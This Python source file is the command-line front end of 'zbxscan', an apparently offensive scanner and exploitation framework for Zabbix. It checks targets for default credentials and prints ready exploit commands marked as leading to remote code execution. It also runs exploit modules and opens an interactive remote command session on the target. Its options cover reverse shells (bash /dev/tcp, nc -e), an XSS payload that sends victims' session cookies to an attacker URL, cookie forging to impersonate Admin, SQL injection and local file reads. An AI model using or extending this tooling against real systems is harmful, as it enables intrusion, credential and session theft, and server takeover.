"""CLI: zscan -m passive|-a active [-t target] ... [-exp CVE] [exploit args]."""
from __future__ import annotations

import argparse
import csv
import json
import sys

from . import db, passive, fingerprint
from .exploits import REGISTRY as _REGISTRY

REGISTRY_IDX = set(_REGISTRY)
from .exploits import REGISTRY, find


def _human_bool(b: bool | None) -> str:
    if b is None:
        return "?"
    return "yes" if b else "no"


def _print_fingerprint(fp: fingerprint.Fingerprint) -> None:
    print(f"\n== {fp.target}  ({fp.host}:{fp.port})")
    print(f"   frontend: {fp.base or '/'}  web={_human_bool(fp.web)}  api={_human_bool(fp.api)}")
    if fp.version:
        print(f"   version:  {fp.version}  (branch {fp.branch})")
    if fp.server_header:
        print(f"   server:   {fp.server_header}")
    if fp.x_powered_by:
        print(f"   php:      {fp.x_powered_by}")
    for n in fp.notes:
        print(f"   [i] {n}")


def _c(code, text):
    return f"\033[{code}m{text}\033[0m"


def _poc_label(record_id: str, record: dict) -> str:
    from .exploits import find
    if find(record_id) is not None:
        return _c(92, f"{'sploit':<10}")
    return _c(90, f"{'—':<10}")


def _banner() -> None:
    art = (
        " ███████╗██████╗ ██╗  ██╗ ███████╗ ██████╗ █████╗ ███╗   ██╗\n"
        " ╚══███╔╝██╔══██╗╚██╗██╔╝ ██╔════╝██╔════╝██╔══██╗████╗  ██║\n"
        "   ███╔╝ ██████╔╝ ╚███╔╝  ███████╗██║     ███████║██╔██╗ ██║\n"
        "  ███╔╝  ██╔══██╗ ██╔██╗  ╚════██║██║     ██╔══██║██║╚██╗██║\n"
        " ███████╗██████╔╝██╔╝ ██╗ ███████║╚██████╗██║  ██║██║ ╚████║\n"
        " ╚══════╝╚═════╝ ╚═╝  ╚═╝ ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝"
    )
    print(_c(96, art))
    print(_c(1, "   Zabbix vulnerability scanner  ·  passive + active exploit modules"))
    print(_c(37, "   Alexander Chaykin@MN3STRASHN0"))
    print()


def _footer() -> None:
    print()
    print(_c(90, "   —————————————————————————————————————————————————————————————"))


def _type_label(r: dict) -> str:
    t = r.get("type") or "misc"
    if t != "other":
        return t
    comp = (r.get("stack_component") or r.get("component") or "").lower()
    for k, v in (("php", "php"), ("apache", "apache"), ("nginx", "nginx"),
                 ("openssl", "openssl"), ("postgres", "postgres"),
                 ("glibc", "glibc"), ("logback", "logback"), ("duktape", "duktape")):
        if k in comp:
            return v
    s = (r.get("summary") or "").lower()
    if any(w in s for w in ("denial of service", "cpu", "resource", "crash",
                            "uncontrolled", "disproportionate", "consume")):
        return "dos"
    if any(w in s for w in ("buffer overflow", "buffer overrun", "out of bounds",
                            "use-after-free", "memory", "stack", "overrun")):
        return "memory-corruption"
    if any(w in s for w in ("information", "disclosure", "expose", "view",
                            "read", "leak", "access")):
        return "info-disclosure"
    if any(w in s for w in ("authentication", "login", "bypass", "permission",
                            "privilege", "unauth", "non-admin")):
        return "auth"
    if "ssrf" in s:
        return "ssrf"
    if "timing" in s or "execution time" in s:
        return "timing"
    if "injection" in s:
        return "injection"
    return "misc"


def _sev_bucket(r: dict) -> str:
    try:
        v = float((r.get("severity") or {}).get("cvss"))
    except (TypeError, ValueError):
        v = 0
    if v >= 9:
        return "CRIT"
    if v >= 7:
        return "HIGH"
    if v >= 4:
        return "MED"
    return "LOW"


def _sev_bucket_color(b: str) -> str:
    return {"CRIT": "38;5;208", "HIGH": 91, "MED": 33, "LOW": 92}[b]


def _print_hits(report: passive.TargetReport, expand_components: bool = False,
                show_commands: bool = False) -> None:
    RED, GREEN, YELLOW, CYAN, BOLD = 91, 92, 93, 96, 1
    RCE_TYPES = {"rce", "sql-injection", "command-injection", "saml-sso-bypass"}
    hits = report.hits
    if not hits and not expand_components:
        print(_c(YELLOW, "   [*] no vulnerability records match this version"))
        return
    # — затронутые уязвимости, по критичности, в строчку —
    if hits:
        buckets = {"CRIT": [], "HIGH": [], "MED": [], "LOW": []}
        for h in hits:
            buckets[_sev_bucket(h.record)].append(h)
        print("\n" + _c(BOLD, "   [+] Affected Vulns")
              + _c(90, "  (✓ = exploit available; →RCE = leads to RCE)"))
        for b in ("CRIT", "HIGH", "MED", "LOW"):
            if not buckets[b]:
                continue
            items = []
            for h in sorted(buckets[b],
                            key=lambda x: (x.record.get("severity") or {}).get("cvss") or "",
                            reverse=True):
                r = h.record
                label = _type_label(r)
                has_mod = r["id"] in REGISTRY_IDX
                if has_mod:
                    mark = _c(92, "✓")
                    if r["type"] in RCE_TYPES and h.condition_status == "pass":
                        mark += _c(BOLD + 91, "→RCE")
                elif h.condition_status == "fail":
                    mark = _c(RED, "✗")
                else:
                    mark = ""
                items.append(f"{r['id']}({label}){mark}")
            print(f"      {_c(_sev_bucket_color(b), b + ':')} " + ", ".join(items))
            if b != "LOW":
                print()
        if report.creds_reevaluated:
            print(_c(90, "       (conditions re-evaluated with the working default creds)"))
    # — auto pwn: chains that lead to RCE —
    apwn = []
    for h in hits:
        cls = find(h.record["id"])
        if cls is None:
            continue
        usage = getattr(cls, "usage", "") or ""
        if "installer-level" in usage or "not remote" in usage:
            continue
        if h.record["type"] in RCE_TYPES or ("RCE" in usage.upper() and "->" in usage):
            apwn.append(h)
    if apwn:
        cred = next((c for c in report.creds if c.ok), None)
        creds_opt = (f"--user {cred.username} --password {cred.password}" if cred
                     else "--user <u> --password <p>")
        print("\n" + _c(BOLD + 91, "   [+] HAVE AUTO PWN:"))
        for h in sorted(apwn, key=lambda x: x.record["id"]):
            r = h.record
            cmd = f"zbxscan -a -t {report.target} -exp {r['id']} {creds_opt}" + (
                " --cmd 'id'" if r["type"] in RCE_TYPES else "")
            print(_c("1;91", "      " + r["id"]) + f" ({_type_label(r)})  " + _c(90, cmd))
    # — к чему есть эксплуатация —
    exploitable = [h for h in hits
                   if h.record["id"] in REGISTRY_IDX or h.condition_status == "pass"]
    if exploitable:
        if show_commands:
            print("\n" + _c(BOLD, "   [+] Ready exploit commands:"))
            for h in sorted(exploitable, key=lambda x: x.record["id"]):
                r = h.record
                cmd = f"zbxscan -a -t {report.target} -exp {r['id']}" + (" --cmd 'id'" if r["type"] in
                      ("rce", "sql-injection", "command-injection", "saml-sso-bypass") else "")
                print(_c(GREEN, "      ✓ " + r["id"]) + "  " + _c(90, cmd))
        else:
            print("\n" + _c(BOLD, f"   [+] {len(exploitable)} exploitable (module/PoC)"))
            print(_c(90, "       use --exploits to see ready exploit commands"))
    # — компонентные CVE —
    if report.components:
        n = len(report.components)
        print("\n" + _c(BOLD, f"   [+] FOUND {n} component CVE(s)")
              + _c(90, " (PHP/Apache/nginx/DB in the stack) — --components for details"))
        if expand_components:
            for c in report.components:
                poc = _c(92, "ours") if _poc_label(c["id"], c).strip() not in ("—",) else _c(90, "—")
                print(f"      {c['id']:<20} {c.get('stack_component',''):<10} "
                      f"{c.get('component_version_range','')[:26]:<28} {poc}  {c['summary'][:50]}")
    else:
        print(_c(90, "   [+] component CVEs: not determined for this branch"))


def _print_auth(report: passive.TargetReport) -> None:
    ctx = report.auth_context or {}
    am = ctx.get("auth_methods") or {}
    print("\n   auth: SSO-page=" + _human_bool(am.get("saml_sso_present")) +
          " sso_button=" + _human_bool(am.get("sso_button")) +
          " ldap=" + _human_bool(am.get("ldap_link")) +
          " TOTP-prompt=" + _human_bool(am.get("post_login_2fa_prompt"))
          if am else "")
    if am and am.get("login_page_markers"):
        print(f"        login-page markers: {am['login_page_markers']}")
    if am and am.get("signed_in_no_2fa"):
        print("        2FA: not detected with these creds")
    if am and not am.get("signed_in_no_2fa") and am.get("post_login_2fa_prompt"):
        print("        2FA/TOTP: code prompt after login (need --totp-secret for active mode)")


def _print_components(report: passive.TargetReport) -> None:
    if not report.components:
        return
    print(f"\n   stack component CVEs (branch {report.fp.branch}):")
    for c in report.components:
        poc = _human_bool((c.get("public_poc") or {}).get("exists"))
        print(f"   - {c['id']:<20} {c['stack_component']:<10} {c['component_version_range']:<28} "
              f"poc={poc}  {c['summary'][:60]}")


def _print_creds(report: passive.TargetReport) -> None:
    ok = [c for c in report.creds if c.ok]
    if ok:
        print("\n" + _c("1;91", "   [!!] WORKING DEFAULT CREDENTIALS:"))
        for c in ok:
            print(_c("1;91", f"       {c.username!r} / {c.password!r}  ({c.category}) — {c.detail}"))
        print(_c("1;91", "       NOTE: any user login unlocks script/item RCE techniques (see -exp)"))
    elif report.creds:
        print(f"\n   [*] default creds checked: {len(report.creds)} attempt(s), none worked "
              f"(5 failed logins -> 30s lockout; add --all-creds for the full list)")


def _report_json(rep: passive.TargetReport) -> dict:
    ctx = rep.auth_context or {}
    return {
        "target": rep.target,
        "fingerprint": {"version": rep.fp.version, "branch": rep.fp.branch,
                        "base": rep.fp.base, "api": rep.fp.api, "web": rep.fp.web,
                        "server": rep.fp.server_header, "php": rep.fp.x_powered_by,
                        "sso_present": rep.fp.sso_present},
        "hits": [
            {"id": h.record["id"], "kind": h.record["kind"], "type": h.record["type"],
             "cvss": (h.record.get("severity") or {}).get("cvss"),
             "condition": h.condition_status, "detail": h.condition_detail,
             "patched_in_branch": h.patched,
             "poc_public": bool((h.record.get("public_poc") or {}).get("exists")),
             "poc_ours": h.record["id"] in REGISTRY_IDX,
             "verified": h.record.get("verified_on", [])}
            for h in sorted(rep.hits, key=lambda x: x.record["id"])
        ],
        "exploitable": [
            {"id": h.record["id"],
             "type": h.record["type"],
             "cmd": f"zbxscan -a -t {rep.target} -exp {h.record['id']} " + (("--cmd 'id'") if h.record["type"] in ("rce","sql-injection","command-injection","saml-sso-bypass") else "")}
            for h in rep.hits if h.record["id"] in REGISTRY_IDX
        ],
        "found_component_cves": len(rep.components),
        "components": [{"id": c["id"], "component": c.get("stack_component"),
                        "range": c.get("component_version_range")}
                       for c in rep.components],
        "creds": [{"username": c.username, "password": c.password, "ok": c.ok}
                  for c in rep.creds],
        "auth_context": {k: v for k, v in ctx.items() if k not in ("token", "rules")} if ctx else None,
        "auth_methods": (ctx.get("auth_methods") or {}) if ctx else None,
        "auto_chain": [
            {"id": h.record["id"], "cmd": f"zbxscan -a -t {rep.target} -exp {h.record['id']} "
                                    "--user <u> --password <p> --cmd 'id'"}
            for h in rep.hits if h.condition_status == "pass"
            and h.record["type"] in {"rce", "sql-injection", "saml-sso-bypass", "command-injection"}
        ],
        "notes": rep.notes,
    }


def _print_hosts_import(rep: passive.TargetReport) -> None:
    ctx = rep.auth_context or {}
    if not ctx.get("token"):
        print("   [*] --import-hosts: creds login failed", file=sys.stderr)
        return
    probe = passive.HttpProbe(timeout=8.0)
    try:
        hs = passive._rpc(probe, rep.fp, "host.get",
                          {"output": ["hostid", "host"],
                           "selectInterfaces": ["ip", "dns", "port", "type"]},
                          auth=ctx.get("token"))
        rows = []
        for hh in hs.get("result") or []:
            for it in hh.get("interfaces") or []:
                addr = it.get("dns") or it.get("ip")
                rows.append((hh["host"], addr or "-", it.get("port") or "-"))
        for r in rows:
            print(f"     {r[0]:<32} {r[1]:<22} :{r[2]}")
        print(f"   [*] {len(rows)} interface(s) discovered — pass any as -t HOST:PORT")
    finally:
        probe.close()


def cmd_passive(args: argparse.Namespace) -> int:
    targets: list[str] = []
    if args.targets:
        targets.extend(args.targets)
    if args.list_file:
        with open(args.list_file, newline="", encoding="utf-8") as f:
            for row in csv.reader(f):
                for cell in row:
                    cell = cell.strip()
                    if cell and not cell.startswith("#"):
                        targets.append(cell)
    if not targets:
        print("no targets: pass -t <host[:port]> or -l <file>", file=sys.stderr)
        return 2
    out_all = []
    if args.format != "json":
        _banner()
    for t in targets:
        # --user defaults to "Admin"; creds are "given" only when a password is
        # provided, else leave both None so the default-creds auto-re-evaluation runs
        use_creds = bool(args.password)
        rep = passive.scan_target(t, timeout=args.timeout, all_creds=args.all_creds,
                                  user=args.user if use_creds else None,
                                  password=args.password if use_creds else None)
        if args.format == "json":
            out_all.append(_report_json(rep))
            continue
        _print_creds(rep)
        print(_c(96, f"\n   === Target: {rep.target} ==="))
        _print_fingerprint(rep.fp)
        _print_hits(rep, expand_components=args.components, show_commands=args.exploits)
        if rep.auth_context:
            _print_auth(rep)
        if args.import_hosts:
            _print_hosts_import(rep)
    if args.format == "json":
        print(json.dumps(out_all if len(out_all) > 1 else (out_all[0] if out_all else {}),
                         ensure_ascii=False, indent=1))
    else:
        _footer()
    return 0


def cmd_active(args: argparse.Namespace) -> int:
    if not args.targets or len(args.targets) != 1:
        print("-m active requires exactly one -t <target>", file=sys.stderr)
        return 2
    target = args.targets[0]
    record = db.record(args.exp)
    if record is None:
        print(f"unknown id {args.exp!r}: see database (db/vulns.json)", file=sys.stderr)
        return 2
    _banner()
    fp = fingerprint.fingerprint(target, timeout=args.timeout)
    _print_fingerprint(fp)
    cls = find(args.exp)
    if cls is None:
        print(f"\n[!] no exploit module registered for {args.exp} "
              f"(registered: {sorted(REGISTRY) or 'none'}); condition check:",
              file=sys.stderr)
        from .exploits import condition
        print("   ", condition(args.exp, fp))
        return 1
    mod = cls()
    if args.exp_help:
        from .exploits import render_help
        print(render_help(args.exp))
        return 0
    module_args = {k: v for k, v in {
        "cmd": args.cmd, "user": args.user, "password": args.password,
        "query": args.query, "db-host": args.db_host, "db-port": args.db_port,
        "db-user": args.db_user, "db-pass": args.db_pass, "db-name": args.db_name,
        "db-type": args.db_type, "file": args.file, "trap-port": args.trap_port,
        "length": args.length, "probe-list": args.probe_list, "ws-port": args.ws_port,
        "agent-port": args.agent_port, "marker": args.marker,
        "shell": args.shell, "revshell": args.revshell, "revshell-shell": args.revshell_shell,
        "sql-auto": args.sql_auto,
        "xss-callback": args.xss_callback, "xss-mode": args.xss_mode,
        "xss-cleanup": args.xss_cleanup, "seed-key": args.seed_key,
    }.items() if v is not None}
    for name in mod.args:
        val = getattr(args, name.replace("-", "_"))
        if val is not None:
            module_args[name] = val
    res = mod.run(target, fp, module_args)
    print()
    for k, v in res.items():
        if k == "rce":
            print(f"rce: {json.dumps(v, ensure_ascii=False)[:400]}")
        else:
            print(f"{k}: {v}")
    interactive = isinstance(res.get("rce"), dict) or isinstance(res.get("shell"), dict)
    if args.cmd or getattr(args, "shell", False) or getattr(args, "revshell", None) \
            or not res.get("ok") or not interactive:
        _footer()
        return 0 if res.get("ok") else 1
    # interactive RCE session (no --cmd given): each line executes via the module
    if res.get("ok"):
        print("\nInteractive session (module ok). Commands execute on the target; "
              "type 'exit' to quit, '!re-run' to log in again.")
        while True:
            try:
                line = input("zsh# ")
            except EOFError:
                break
            if line.strip().lower() in ("exit", "quit"):
                break
            if not line.strip():
                continue
            try:
                rr = mod.run(target, fp, dict(module_args, cmd=line))
                out = (rr.get("rce") or {}).get("script.execute") if isinstance(rr.get("rce"), dict) else None
                val = ((out or {}).get("result") or {}).get("value") if isinstance(out, dict) else None
                print(val if val is not None else json.dumps(rr, ensure_ascii=False)[:400])
            except KeyboardInterrupt:
                print("\n(interrupt)")
            except Exception as e:  # noqa: BLE001
                print(f"error: {e}")
    _footer()
    return 0


def cmd_list(args: argparse.Namespace) -> int:
    import json as _json
    for r in sorted(db.vulns(), key=lambda x: x["id"]):
        if args.branch:
            aff = [a for a in r.get("affected_versions") or [] if a.get("branch") == args.branch]
            if not aff:
                aff = [a for a in r.get("applies_to_zabbix") or [] if a.get("branch") == args.branch]
            if not aff:
                continue
        line = f"{r['id']:<20} {r['kind']:<10} {r['type']:<20} {_json.dumps(r.get('affected_versions') or r.get('applies_to_zabbix') or [], ensure_ascii=False)[:60]}"
        print(line)
    return 0


def _rewrite_argv(argv: list[str]) -> list[str]:
    """User-facing aliases: -exp X -> --exp X; -a -> --mode active."""
    out: list[str] = []
    i = 0
    while i < len(argv):
        t = argv[i]
        if t == "-exp":
            out += ["--exp"]
        elif t == "-a":
            out += ["--mode", "active"]
        else:
            out.append(t)
        i += 1
    return out


def main(argv: list[str] | None = None) -> int:
    if argv is None:
        argv = sys.argv[1:]
    argv = _rewrite_argv(argv)
    ap = argparse.ArgumentParser(prog="zbxscan", description="Zabbix vulnerability scanner")
    ap.add_argument("-m", "--mode", choices=["passive", "active"], required=True)
    ap.add_argument("-t", "--targets", action="append", metavar="HOST[:PORT]",
                    help="single target (repeatable; active mode: exactly one)")
    ap.add_argument("-l", "--list-file", metavar="FILE", help="target list (one per line / csv)")
    ap.add_argument("--timeout", type=float, default=8.0)
    ap.add_argument("--all-creds", action="store_true", help="try full credentials list, not just defaults")
    ap.add_argument("--exp", metavar="CVE-id", help="active mode: vulnerability id to exploit")
    ap.add_argument("--exp-help", action="store_true", help="show exploit usage instead of running")
    ap.add_argument("--cmd", help="RCE: command to execute via the exploited path")
    ap.add_argument("--shell", action="store_true",
                    help="RCE: persistent interactive shell (module-driven, e.g. CVE-2021-46088)")
    ap.add_argument("--revshell", default=None, metavar="LHOST:LPORT",
                    help="RCE: start listener and push a reverse shell payload")
    ap.add_argument("--revshell-shell", default="bash", choices=["bash", "sh", "nc"],
                    help="payload flavour for --revshell (bash /dev/tcp, nc -e, busybox fifo+nc)")
    ap.add_argument("--xss-callback", default=None, metavar="URL",
                    help="XSS payload: attacker URL receiving the victim's zbx_session")
    ap.add_argument("--xss-mode", default=None, choices=["full", "dry", "beacon"],
                    help="XSS payload mode: full (create+execute as victim), dry, beacon")
    ap.add_argument("--xss-cleanup", default="1",
                    help="XSS payload: delete the created script after execution (1/0)")
    ap.add_argument("--seed-key", default=None,
                    help="session signing key for cookie-forge modules (CVE-2026-23933/36466); 'auto' reads from --db-host")
    ap.add_argument("--sql-auto", action="store_true",
                    help="after SQLi->RCE dump DB recon: version, user, connections, table samples")
    ap.add_argument("--user", default="Admin", help="username to impersonate/use (cookie forging, login)")
    ap.add_argument("--password", default="", help="password if the exploit needs an authenticated session")
    ap.add_argument("--query", default=None, help="SQL expression for SQLi extraction modules")
    ap.add_argument("--db-host", default="127.0.0.1")
    ap.add_argument("--db-port", default="3306")
    ap.add_argument("--db-user", default="zabbix")
    ap.add_argument("--db-pass", default="zabbix")
    ap.add_argument("--db-name", default="zabbix")
    ap.add_argument("--db-type", default="MYSQL")
    ap.add_argument("--trap-port", default="10051", help="Zabbix server trapper TCP port (CVE-2024-22120)")
    ap.add_argument("--file", default=None, help="file path for LFI modules (CVE-2025-27232, CVE-2022-46768)")
    ap.add_argument("--length", default="32", help="extraction length for SQLi modules (md5=32, bcrypt=60)")
    ap.add_argument("--probe-list", default=None, help="comma-separated usernames for CVE-2024-36469 timing")
    ap.add_argument("--ws-port", default="10053", help="Zabbix web service TCP port (CVE-2022-46768)")
    ap.add_argument("--agent-port", default="10050", help="agent/agent2 passive TCP port (smartctl family)")
    ap.add_argument("--marker", default="ZBXINJECT", help="marker string for arg-injection probes")
    ap.add_argument("--sleep", default="10", help="CVE-2025-27240: sleep seconds for the time-based payload")
    ap.add_argument("--payload", default="sleep", choices=["sleep", "error"],
                    help="CVE-2025-27240: sleep (timing oracle) or error (log-marker) payload")
    ap.add_argument("--db-flavor", default="postgres", choices=["postgres", "mysql"],
                    help="CVE-2025-27240: DB backend for the SQL payload")
    ap.add_argument("--max-wait", default="100",
                    help="CVE-2025-27240: seconds to wait for trigger processing (config cache)")
    ap.add_argument("--format", choices=["table", "json"], default="table",
                    help="output format (passive mode)")
    ap.add_argument("--import-hosts", action="store_true",
                    help="passive with creds: also list editable hosts+interfaces as targets")
    ap.add_argument("--components", action="store_true",
                    help="passive: expand component-stack CVE details in the output")
    ap.add_argument("--exploits", action="store_true",
                    help="passive: print the ready exploit commands for exploitable hits")
    ap.add_argument("--list-cves", action="store_true", help="dump the vulnerability database")
    ap.add_argument("--branch", help="with --list-cves: filter by branch")
    args = ap.parse_args(argv)

    if args.list_cves:
        return cmd_list(args)
    if args.mode == "passive":
        return cmd_passive(args)
    return cmd_active(args)


if __name__ == "__main__":
    sys.exit(main())
